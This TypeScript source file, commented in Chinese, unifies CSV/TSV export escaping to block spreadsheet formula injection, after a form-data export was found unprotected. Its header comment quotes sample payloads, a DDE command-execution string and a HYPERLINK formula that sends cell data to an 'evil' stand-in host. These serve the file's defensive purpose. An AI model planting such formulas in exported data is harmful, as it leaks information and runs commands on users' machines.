/**
 * 表格文本导出（CSV / TSV）的**统一转义** —— 单一真源（2026-11-01 #282）
 *
 * ## 为什么必须统一
 *
 * 同一件事本来有三种写法，分布在三个文件里：
 * - `data/composables/useTableExtras.ts` 自带 `csvFormulaSafe`
 * - `data/composables/useTableScreenshot.ts` 的 `buildTsv` 内联一份前缀判定
 * - `form-builder/designer/FormDataSummary.vue` **一份都没有**（只做引号转义）
 *
 * 前两条防住了，第三条漏了 —— 而第三条导出的正是**表单收集来的用户数据**
 * （最不可信的那一份）。用户在某个字段里填 `=cmd|'/c calc'!A0`，
 * 管理员导出汇总 CSV 用 Excel 打开，公式就被执行。
 *
 * ## 公式注入是什么
 *
 * Excel / WPS / LibreOffice 把以 `=` `+` `-` `@` 开头的单元格当**公式**解析；
 * 以制表符/回车开头的也会被特殊处理（前者是分列符，后者可能触发下一次求值）。
 * 经典载荷不是 `=1+1`，而是 `=HYPERLINK("http://evil/"&A1,"点我")`
 * 或 `=cmd|'/c calc'!A0`（DDE）。用户看不见任何异常，数据却在泄露/执行。
 *
 * ## 防御口径
 *
 * 前缀**单引号** `'`：Excel 会把它当"强制文本"标记，显示且按文本保存。
 * 这是各表格软件通用、且不破坏肉眼内容的做法（用户看到 `'=1+1` 的引号是编辑器行为，
 * 单元格里显示的是 `=1+1` 字面量）。
 */

/** 会被表格软件当作公式/特殊解析的开头字符 */
const FORMULA_START = /^[=+\-@\t\r]/

/**
 * 公式注入防护：以 `= + - @ \t \r` 开头的值加单引号前缀。
 *
 * 用于**单元格值**。列名/表头通常来自开发者的列定义而非用户数据，但若表头也可能
 * 含用户输入（例如动态列），同样应过一遍。
 */
export function csvFormulaSafe(val: string): string {
  return FORMULA_START.test(val) ? `'${val}` : val
}

/** 控制字符清洗：值内的 `\t` `\r` `\n` 一律成空格（TSV 用它分列分行，否则粘贴后错位） */
export function stripTabularControls(val: string): string {
  return val.replace(/[\t\r\n]+/g, ' ')
}

/**
 * CSV 单元格：**先防公式，再一律加引号**。
 *
 * - 顺序不能反：先加引号再防公式会得到 `"'=1+1"`，前缀落在引号外，Excel 仍可能当公式。
 * - **一律加引号**（而不是"必要时才加"）：本仓 DataTable 的 CSV 导出契约历来是全字段带引号，
 *   宿主侧解析脚本按此写过；改成最小加引号属于无收益的格式破坏。
 */
export function csvCell(val: string): string {
  return `"${csvFormulaSafe(val).replace(/"/g, '""')}"`
}

/** TSV 单元格：清洗控制字符 + 防公式 */
export function tsvCell(val: string): string {
  return csvFormulaSafe(stripTabularControls(val))
}
